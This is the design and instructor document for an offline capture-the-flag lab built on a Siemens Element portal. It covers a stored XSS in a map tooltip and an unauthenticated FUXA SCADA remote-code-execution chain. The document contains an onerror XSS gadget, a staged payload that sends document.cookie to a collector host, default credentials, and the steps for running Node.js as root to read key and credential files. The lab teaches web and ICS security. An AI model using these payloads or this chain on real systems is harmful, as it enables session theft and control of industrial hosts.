# Design and internals

How the lab is built and why, and the two vulnerabilities it teaches. For the
full solution see [`solution/`](../solution).

## Repository layout

```
web/        portal: Angular 21 + Siemens Element 49.16.0 frontend, Express API
web/tools/  build-time open-source inventory generator (feeds the About page)
scada/      stage 2: FUXA 1.3.0 SCADA (dispatch centre, CVE-2026-43947)
scada-gate/ auth proxy: gates the FUXA console behind a supervisor session
bot/        duty-supervisor bot (puppeteer-core + Debian chromium)
collector/  offline exfiltration collector
solution/   instructor material: reference exploits (stage 1 + stage 2) + writeup
deploy/     push images to GHCR + a pull-only compose to hand out to students
ctf.sh      per-student instance helper
```

Everything runs locally. No internet access is needed at runtime — the basemap is
a vendored Natural Earth outline, and exfiltration goes to the bundled collector
instead of webhook.site or Burp Collaborator.

## The application

The portal is a plain Siemens Element application, built from the stock
components so that it reads like a real product rather than a CTF page:

| Element building block                     | Where                                            |
|--------------------------------------------|--------------------------------------------------|
| `si-application-header` + `si-navbar-vertical` | Application frame (`app/layout/shell.component.ts`) |
| `si-launchpad-factory`, `si-header-dropdown`, `si-account-details` | Header launchpad and account menu |
| `si-layout-main-padding` / `si-layout-header` + `si-breadcrumb-router` | Standard content page (`app/shared/page.component.ts`) |
| `si-card`, `si-content-action-bar`, `si-summary-widget`, `si-status-bar`, `si-search-bar`, `si-empty-state`, `si-inline-notification` | Page content |
| `si-landing-page` + `si-login-basic`       | Supervisor sign-in (`/admin/login`)               |
| `si-about`                                 | About page (`/about`)                             |
| `si-map` + `si-map-tooltip`                | The vulnerable asset map                          |

Routes: `/` overview, `/sites` asset register, `/sites/:id` site record,
`/register` registration form, `/about`, `/admin` supervisor desk,
`/admin/review/:id` review map (the bot's target), `/admin/login`.

Dark and light appearance are both wired up through `SiThemeService`; the toggle
sits in the header. The brand wordmark overrides the theme's placeholder logo in
`src/styles.scss`.

### Colour palette

The open-source `@siemens/element-theme` ships a **placeholder** palette: the
token names are the Siemens ones (petrol, bold green, deep blue, interactive
coral, sand) but the values are generic violets and greys. The Element docs say
the default theme is not part of the Siemens branding, and Siemens reserves its
corporate brand theme for official Siemens products.

`src/_siemens-theme.scss` puts the published Siemens colours back behind those
names, as `--element-*` overrides for both schemes:

| | Light | Dark |
|---|---|---|
| Page background | Light Sand `#f3f3f0` | Deep Blue `#000028` |
| Surface | `#ffffff` | `#15152e` |
| Primary action | accessible petrol `#007082` | interactive coral `#00cccc` |
| Primary hover | `#005159` | bold green `#00ffb9` |
| Accent / brand mark | Siemens Petrol `#009999` | `#00cccc` |
| Body text | Deep Blue `#262648` | `#ffffff` |

Values come from the Siemens Element data-visualisation reference palette
(`si.ref.color.data.*`), which is published; the dark surface ramp is derived
from Siemens Deep Blue `#000028`. Pure petrol only reaches 3.5:1 against white,
so anything carrying a label uses the darker accessible petrol — every text /
background pair in the table above is at or above 4.5:1. The offline basemap and
the map markers use the same palette.

Only brand and status tokens are overridden; the chart/data tokens
(`--element-data-*`) still carry the upstream placeholder values, which is
harmless because the portal uses no charts.

### About page and open-source inventory

`/about` uses `si-about` in license **api** mode. The package list is not
hand-maintained: `web/tools/collect-licenses.js` walks the installed runtime
dependency trees of the frontend and the backend at image build time and records
name, version, declared license, direct/transitive status and the verbatim
license text of every package. The backend serves it as the three-level API the
component expects:

```
GET /api/licenses                      -> categories
GET /api/licenses/:category            -> packages in that category
GET /api/licenses/:category/:index     -> that package's license text
```

This doubles as the recon surface for the challenge: it is where a student finds
`@siemens/maps-ng 49.16.0`.

### Decoy — Red Herring Fishing Co.

The asset register seeds a distractor site, **Red Herring Fishing Co.** (Basel),
with a toy storefront selling joke items (*Seemannsgarn*, *Snake Oil «Nordsee»*,
*Smoked Red Herring*, a *Phishing Tackle Set*, …). It has a real cart/checkout
API over plain HTTP so it invites a look:

```
GET  /api/shop/cart        current cart (keyed by a gridops_cart cookie)
POST /api/shop/cart        { siteId, product } -> add an article
POST /api/shop/checkout    confirm; returns the order id and item count
```

It is a dead end by design. Prices are resolved server-side from the catalogue
and unknown articles are rejected, so intercepting/replaying the traffic
(Burp / mitmproxy) changes nothing and yields no flag. Its only job is to keep a
class from converging on the one real path too quickly; nothing in the app tells
students it is a decoy.

## The vulnerability — stage 1 (stored XSS)

`SiMapTooltipComponent` in `@siemens/maps-ng` 49.16.0:

```js
getLabelSnippet(label) {
  return `<div>${label}</div>`;        // no escaping
}
setContent(tooltip) {
  this.content().nativeElement.innerHTML = tooltip;   // <-- sink
}
```

`SiMapComponent.showTooltipContent()` feeds it `feature.getProperties().name`,
i.e. attacker-controlled data, whenever the pointer hovers a marker and
`displayTooltipOnHover` is enabled.

Fixed in **49.16.1**, which renders the labels through an Angular `@for` with
interpolation instead:

```html
@for (label of tooltipLabels(); track $index) {
  <div>{{ label }}</div>
}
```

Teaching point: `innerHTML =` does **not** execute `<script>` tags, so students
must reach for an event-handler gadget. Note that `<svg onload=...>` does *not*
fire either when the markup is inserted through `innerHTML` — `<img src=x
onerror=...>` is the gadget that works here. Verified in this lab.

### Difficulty knobs (`.env`)

| Variable                  | Default | Effect                                                                 |
|---------------------------|---------|------------------------------------------------------------------------|
| `MAX_LABEL_LENGTH`        | `-1`    | `-1` = no truncation. Set to `50` (the library default) for the hard variant — see below. |
| `REVIEW_COOLDOWN_SECONDS` | `15`    | Rate limit per IP on review requests.                                   |
| `SESSION_TTL_MINUTES`     | `30`    | How long a stolen supervisor cookie stays valid.                        |
| `PAGE_DWELL_MS`           | `6000`  | How long the bot stays on the review page.                              |
| `FLAG`                    | —       | Stage 1 flag (falls back to a baked-in default when unset).            |
| `ADMIN_PASSWORD`          | —       | Supervisor password used by the bot. Students never need it.            |

### Hard variant

With `MAX_LABEL_LENGTH=50` the library truncates the label mid-tag, so the whole
payload must fit in 50 characters. The collector supports this: it hosts a
second stage with a JavaScript MIME type, and answers to the short network alias
`c`, so a two-stage payload fits comfortably.

```bash
# 1. stage the real payload (any length)
curl -X POST --data-binary \
  "fetch('http://c:8080/?c='+encodeURIComponent(document.cookie));" \
  http://localhost:8200/s

# 2. register a site with this 40-character name
<img src=x onerror=import('//c:8080/s')>
```

## The vulnerability — stage 2 (FUXA RCE, CVE-2026-43947)

Stage 1 ends with a stolen supervisor session. That session unlocks a second
target: the **Central Control System**, a restricted asset that is filtered out
of the public register and whose record is served only to a supervisor session.
The control system is a real **FUXA 1.3.0** SCADA/HMI (the `scada` service), a
dummy regional load dispatch centre for the 110/16 kV network.

```
┌──────────────┐  stolen supervisor session   ┌──────────────┐
│  student     │ ───────────────────────────▶ │  web portal  │
│              │ ◀─── control system address ─│  /admin      │
└──────┬───────┘                              └──────────────┘
       │ replays stolen supervisor cookie
       ▼
┌──────────────┐   cookie ok?   ┌──────────────┐
│ scada-gate   │ ─────────────▶ │  scada       │  FUXA 1.3.0 HMI (internal only)
│ :8300        │ ◀───────────── │  (root)      │  -> emergency-dispatch-key.txt
└──────────────┘                └──────────────┘     (flag 2)
   401 without a supervisor session
   │ CVE-2026-43947 (unauth RCE at the FUXA layer)
```

**The vulnerability.** `POST /api/runscript` is meant to run a *stored*
server-side script. Its authorisation check (`scripts/index.js :: isAuthorised`)
looks up the stored script named in the request and checks its `permission`
field — but a script with no `permission` passes for any caller, including an
unauthenticated guest. When the body carries `test: true`, FUXA executes the
`code` from the request body instead of the stored script
(`scripts/msm.js :: runTestScript`). Authorisation and execution use different
sources, so a guest runs arbitrary Node.js as root. Fixed in FUXA 1.3.1.

The seeded `gridops-dispatch` project ships two server-side scripts with no
`permission` field, which is the only precondition. `GET /api/project` is an
unauthenticated info disclosure that hands the student a valid script id/name.

**Reaching the console.** The dispatch console is on the operations network, not
the public internet. `scada-gate` models that boundary: it publishes `:8300` and
proxies to FUXA (HTTP + WebSocket) **only** for a caller that already holds a
GridOps supervisor session. Without the `gridops_session` cookie it returns
`401`, and the FUXA instance behind it is never touched. FUXA itself is not
published on any host port. The cookie is a host-only cookie for `localhost` and
cookies are not isolated by port, so the browser sends it to `:8300` as it does
to the portal on `:8100`. **You cannot reach stage 2 without completing stage 1.**

**The chain:**

1. Steal the supervisor session (stage 1) and open `/admin` → the dashboard and
   the restricted asset record reveal the console at `http://localhost:8300`.
2. Replay the stolen cookie to `:8300` (the gate). `GET /api/project` → read a
   script id and name.
3. `POST /api/runscript` with `test: true` and attacker Node.js in `code` →
   command execution as root on the SCADA host.
4. Read `/opt/gridops/emergency-dispatch-key.txt` → **flag 2**. The host also
   holds `/opt/gridops/field-devices.conf` with field-device credentials, a
   realistic post-exploitation reward.

The FUXA HMI itself can be viewed with its stock default credentials,
`admin` / `123456` (the RCE is unauthenticated, so students never need them).

| Variable            | Default                 | Effect                                         |
|---------------------|-------------------------|------------------------------------------------|
| `STAGE2_ENABLED`    | `true`                  | Show the control system in `/admin` and the restricted record. Set `false` to run stage 1 alone. |
| `SCADA_PORT`        | `8300`                  | Host port for the FUXA console.                |
| `FLAG2`             | —                       | Stage 2 flag (falls back to a baked-in default when unset). |
| `FUXA_ADMIN_USER`   | `admin`                 | FUXA operator account (stock default; students never need it — the RCE is unauthenticated). |
| `FUXA_ADMIN_PASSWORD` | `123456`              | FUXA operator password (stock default).        |

The restricted record is hidden from `GET /api/sites` and returns `404` on
`GET /api/sites/:id` unless the caller holds a supervisor session; the console
itself sits behind `scada-gate`, which enforces the same session. Both the
record *and* the target are gated, so students cannot skip stage 1.

Build note: the `scada` image is built from `frangoteam/fuxa:1.3.0`; the seed
project is imported through FUXA's own API at build time and secure mode is then
enabled. First build pulls the FUXA image (~2.5 GB).

## Instructor notes

- **Students never need the supervisor password.** The only path to `/admin` is
  the stolen session cookie. The password is randomised per deployment (when
  `ADMIN_PASSWORD` is unset) and handed to the bot over a shared volume, so it is
  never in the compose; `docker compose restart web` rotates it. Pin
  `ADMIN_PASSWORD` in `.env` if you want a fixed password for manual login.
- The session cookie is deliberately **not** `HttpOnly`. That is the lesson for
  stage 1; point out that `HttpOnly` would have forced the payload to perform the
  privileged action in-session instead of handing over a credential.
- The bot approves whatever it reviews, so a failed payload still returns a
  status — students get feedback either way.
- State is in memory. `docker compose restart web` resets the lab.
- `solution/exploit.py` runs the whole stage-1 chain end to end and is the
  quickest way to confirm an instance is healthy before a class;
  `solution/exploit_stage2.py` does the same for stage 2.
